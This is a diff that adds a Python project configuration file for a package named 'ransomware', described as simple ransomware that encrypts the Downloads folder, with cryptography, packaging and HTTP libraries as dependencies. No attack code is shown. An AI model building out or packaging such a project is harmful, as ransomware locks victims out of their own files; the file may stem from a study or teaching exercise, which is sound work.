@@ -1,0 +1,11 @@
+[project]
+name = "ransomware"
+version = "0.1.0"
+description = "Simple ransomware encrypting the contents of the Downloads folder"
+readme = "README.md"
+requires-python = ">=3.11"
+dependencies = [
+    "pycryptodomex>=3.23.0",
+    "pyinstaller>=6.13.0",
+    "requests>=2.32.3",
+]
